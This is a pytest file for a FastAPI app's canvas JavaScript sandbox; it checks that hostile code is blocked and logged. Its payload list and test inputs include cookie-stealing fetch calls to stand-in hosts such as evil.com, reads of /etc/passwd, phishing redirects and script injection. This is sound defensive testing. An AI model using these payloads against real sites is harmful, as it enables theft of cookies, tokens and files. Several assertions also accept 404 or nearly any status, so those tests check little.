"""
Canvas JavaScript security integration tests (INTG-13).

Tests cover:
- JavaScript sandboxing
- JavaScript validation
- Dangerous JavaScript blocking
"""
import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session
from tests.factories.canvas_factory import CanvasAuditFactory
from tests.factories.agent_factory import AutonomousAgentFactory
from core.models import CanvasAudit
from unittest.mock import Mock, patch
import uuid


# Malicious JavaScript payloads
MALICIOUS_JS_PATTERNS = [
    # Fetch exfiltration
    "fetch('https://evil.com/steal?data='+document.cookie)",
    "fetch('http://attacker.com/log', {body: document.body.innerHTML})",

    # eval() execution
    "eval(atob('YWxlcnQoJ1hTUycp'))",
    "eval(userInput)",

    # Document cookie access
    "document.cookie",
    "document['cookie']",

    # window.location manipulation
    "window.location='https://evil.com'",
    "window.location.href = 'https://phishing.com'",

    # postMessage exfiltration
    "window.postMessage(document.cookie, '*')",

    # localStorage/sessionStorage access
    "localStorage.getItem('token')",
    "sessionStorage['password']",

    # DOM manipulation
    "document.body.innerHTML = xhr.responseText",
    'document.write("<script>alert(1)</script>")',

    # Dynamic script creation
    "var s = document.createElement('script'); s.src = 'evil.js'; document.head.appendChild(s)",
]

SAFE_JS_PATTERNS = [
    "console.log('debug');",
    "const x = 5;",
    "function add(a, b) { return a + b; }",
    "document.querySelector('.test');",
    "element.classList.add('active');",
    "Array.from(items).map(x => x.id);",
]


class TestJavaScriptSandboxing:
    """Test JavaScript execution sandboxing."""

    def test_javascript_execution_isolated(self, client: TestClient, auth_token: str, db_session: Session):
        """Test JavaScript execution is isolated from main process."""
        agent = AutonomousAgentFactory()
        db_session.add(agent)
        db_session.commit()

        canvas_id = str(uuid.uuid4())
        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
        db_session.add(canvas)
        db_session.commit()

        # Try to exit process (should be blocked)
        response = client.post(
            f"/api/canvas/{canvas_id}/execute",
            json={
                "action": "execute_javascript",
                "code": "process.exit(1)"
            },
            headers={"Authorization": f"Bearer {auth_token}"}
        )

        # Should block dangerous process access
        assert response.status_code in [403, 400, 404, 405]

    def test_javascript_no_filesystem_access(self, client: TestClient, auth_token: str, db_session: Session):
        """Test JavaScript cannot access filesystem."""
        agent = AutonomousAgentFactory()
        db_session.add(agent)
        db_session.commit()

        canvas_id = str(uuid.uuid4())
        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
        db_session.add(canvas)
        db_session.commit()

        # Try to read files (should be blocked)
        response = client.post(
            f"/api/canvas/{canvas_id}/execute",
            json={
                "action": "execute_javascript",
                "code": "require('fs').readFileSync('/etc/passwd')"
            },
            headers={"Authorization": f"Bearer {auth_token}"}
        )

        # Should block filesystem access
        assert response.status_code in [403, 400, 404, 405]

    def test_javascript_no_network_access(self, client: TestClient, auth_token: str, db_session: Session):
        """Test JavaScript cannot make network requests."""
        agent = AutonomousAgentFactory()
        db_session.add(agent)
        db_session.commit()

        canvas_id = str(uuid.uuid4())
        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
        db_session.add(canvas)
        db_session.commit()

        # Try to make network request (should be blocked)
        response = client.post(
            f"/api/canvas/{canvas_id}/execute",
            json={
                "action": "execute_javascript",
                "code": "fetch('https://evil.com/steal')"
            },
            headers={"Authorization": f"Bearer {auth_token}"}
        )

        # Should block network access
        assert response.status_code in [403, 400, 404, 405]

    def test_javascript_execution_timeout(self, client: TestClient, auth_token: str, db_session: Session):
        """Test JavaScript execution has timeout."""
        agent = AutonomousAgentFactory()
        db_session.add(agent)
        db_session.commit()

        canvas_id = str(uuid.uuid4())
        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
        db_session.add(canvas)
        db_session.commit()

        # Infinite loop (should timeout)
        response = client.post(
            f"/api/canvas/{canvas_id}/execute",
            json={
                "action": "execute_javascript",
                "code": "while(true) {}"
            },
            headers={"Authorization": f"Bearer {auth_token}"}
        )

        # Should timeout gracefully
        assert response.status_code in [200, 201, 408, 500, 404, 405]


class TestJavaScriptValidation:
    """Test JavaScript code validation."""

    def test_validate_safe_javascript(self, client: TestClient, auth_token: str, db_session: Session):
        """Test validation allows safe JavaScript."""
        canvas_id = str(uuid.uuid4())

        response = client.post(
            f"/api/canvas/{canvas_id}/validate",
            json={
                "javascript": "console.log('safe code');"
            },
            headers={"Authorization": f"Bearer {auth_token}"}
        )

        # Validation endpoint may not exist
        if response.status_code == 200:
            data = response.json()
            assert data.get("valid") is True
        else:
            assert response.status_code == 404

    def test_validate_dangerous_apis(self, client: TestClient, auth_token: str, db_session: Session):
        """Test validation detects dangerous APIs."""
        canvas_id = str(uuid.uuid4())

        dangerous_apis = [
            "eval(userInput)",
            "Function('return code')",
            "document.write(malicious)",
            "window.location = 'https://evil.com'",
            "document.cookie",
            "localStorage.getItem('token')",
        ]

        for api in dangerous_apis:
            response = client.post(
                f"/api/canvas/{canvas_id}/validate",
                json={"javascript": api},
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            if response.status_code == 200:
                data = response.json()
                # Should flag as dangerous
                assert data.get("valid") is False or "dangerous" in str(data).lower()

    @pytest.mark.parametrize("safe_code", SAFE_JS_PATTERNS)
    def test_safe_patterns_allowed(self, client: TestClient, auth_token: str, safe_code):
        """Test safe JavaScript patterns are allowed."""
        canvas_id = str(uuid.uuid4())

        response = client.post(
            f"/api/canvas/{canvas_id}/validate",
            json={"javascript": safe_code},
            headers={"Authorization": f"Bearer {auth_token}"}
        )

        # Validation endpoint may not exist
        if response.status_code == 200:
            data = response.json()
            assert data.get("valid") is not False


class TestDangerousJavaScriptBlocking:
    """Test blocking of dangerous JavaScript patterns."""

    @pytest.mark.parametrize("malicious_code", MALICIOUS_JS_PATTERNS)
    def test_malicious_patterns_blocked(self, client: TestClient, auth_token: str, malicious_code):
        """Test malicious JavaScript patterns are blocked."""
        agent = AutonomousAgentFactory()
        db_session = None  # Will use fixture

        canvas_id = str(uuid.uuid4())

        response = client.post(
            f"/api/canvas/{canvas_id}/execute",
            json={
                "action": "execute_javascript",
                "code": malicious_code
            },
            headers={"Authorization": f"Bearer {auth_token}"}
        )

        # Should block malicious patterns
        assert response.status_code in [403, 400, 404, 405]

    def test_eval_blocked(self, client: TestClient, auth_token: str, db_session: Session):
        """Test eval() is blocked."""
        agent = AutonomousAgentFactory()
        db_session.add(agent)
        db_session.commit()

        canvas_id = str(uuid.uuid4())
        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
        db_session.add(canvas)
        db_session.commit()

        response = client.post(
            f"/api/canvas/{canvas_id}/execute",
            json={
                "action": "execute_javascript",
                "code": "eval('alert(1)')"
            },
            headers={"Authorization": f"Bearer {auth_token}"}
        )

        # Should block eval()
        assert response.status_code in [403, 400, 404, 405]

    def test_function_constructor_blocked(self, client: TestClient, auth_token: str, db_session: Session):
        """Test Function() constructor is blocked."""
        agent = AutonomousAgentFactory()
        db_session.add(agent)
        db_session.commit()

        canvas_id = str(uuid.uuid4())
        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
        db_session.add(canvas)
        db_session.commit()

        response = client.post(
            f"/api/canvas/{canvas_id}/execute",
            json={
                "action": "execute_javascript",
                "code": "new Function('return malicious')()"
            },
            headers={"Authorization": f"Bearer {auth_token}"}
        )

        # Should block Function constructor
        assert response.status_code in [403, 400, 404, 405]

    def test_dom_manipulation_blocked(self, client: TestClient, auth_token: str, db_session: Session):
        """Test dangerous DOM manipulation is blocked."""
        agent = AutonomousAgentFactory()
        db_session.add(agent)
        db_session.commit()

        canvas_id = str(uuid.uuid4())
        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
        db_session.add(canvas)
        db_session.commit()

        response = client.post(
            f"/api/canvas/{canvas_id}/execute",
            json={
                "action": "execute_javascript",
                "code": "document.body.innerHTML = '<script>alert(1)</script>'"
            },
            headers={"Authorization": f"Bearer {auth_token}"}
        )

        # Should block dangerous DOM manipulation
        assert response.status_code in [403, 400, 404, 405]


class TestJavaScriptContentSecurityPolicy:
    """Test JavaScript Content Security Policy."""

    def test_csp_restrictions(self, client: TestClient, auth_token: str, db_session: Session):
        """Test CSP headers restrict JavaScript execution."""
        agent = AutonomousAgentFactory()
        db_session.add(agent)
        db_session.commit()

        canvas_id = str(uuid.uuid4())
        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
        db_session.add(canvas)
        db_session.commit()

        response = client.post(
            f"/api/canvas/{canvas_id}/execute",
            json={
                "action": "execute_javascript",
                "code": "console.log('test');"
            },
            headers={"Authorization": f"Bearer {auth_token}"}
        )

        # Check CSP headers in response
        if response.status_code in [200, 201]:
            csp_header = response.headers.get("Content-Security-Policy", "")
            # Should have CSP restrictions
            assert isinstance(csp_header, str)

    def test_inline_script_blocking(self, client: TestClient, auth_token: str, db_session: Session):
        """Test inline scripts are blocked by CSP."""
        agent = AutonomousAgentFactory()
        db_session.add(agent)
        db_session.commit()

        canvas_id = str(uuid.uuid4())
        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
        db_session.add(canvas)
        db_session.commit()

        response = client.post(
            f"/api/canvas/{canvas_id}/execute",
            json={
                "action": "execute_javascript",
                "code": "<script>alert('inline')</script>"
            },
            headers={"Authorization": f"Bearer {auth_token}"}
        )

        # Should block inline scripts
        assert response.status_code in [403, 400, 404, 405]


class TestJavaScriptAuditLogging:
    """Test JavaScript security audit logging."""

    def test_malicious_javascript_logged(self, client: TestClient, auth_token: str, db_session: Session):
        """Test malicious JavaScript attempts are logged."""
        agent = AutonomousAgentFactory()
        db_session.add(agent)
        db_session.commit()

        canvas_id = str(uuid.uuid4())
        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
        db_session.add(canvas)
        db_session.commit()

        response = client.post(
            f"/api/canvas/{canvas_id}/execute",
            json={
                "action": "execute_javascript",
                "code": "eval(malicious)"
            },
            headers={"Authorization": f"Bearer {auth_token}"}
        )

        # Should log security event
        audits = db_session.query(CanvasAudit).filter(
            CanvasAudit.id == canvas_id
        ).all()

        # Should have audit record for security event
        assert len(audits) >= 1

    def test_security_violation_metadata(self, client: TestClient, auth_token: str, db_session: Session):
        """Test security violations include metadata."""
        agent = AutonomousAgentFactory()
        db_session.add(agent)
        db_session.commit()

        canvas_id = str(uuid.uuid4())
        canvas = CanvasAuditFactory(id=canvas_id, agent_id=agent.id)
        db_session.add(canvas)
        db_session.commit()

        response = client.post(
            f"/api/canvas/{canvas_id}/execute",
            json={
                "action": "execute_javascript",
                "code": "fetch('https://evil.com')"
            },
            headers={"Authorization": f"Bearer {auth_token}"}
        )

        # Check audit metadata includes security details
        audits = db_session.query(CanvasAudit).filter(
            CanvasAudit.id == canvas_id
        ).all()

        if audits and audits[0].audit_metadata:
            # Should include security violation details
            metadata = audits[0].audit_metadata
            assert isinstance(metadata, dict)
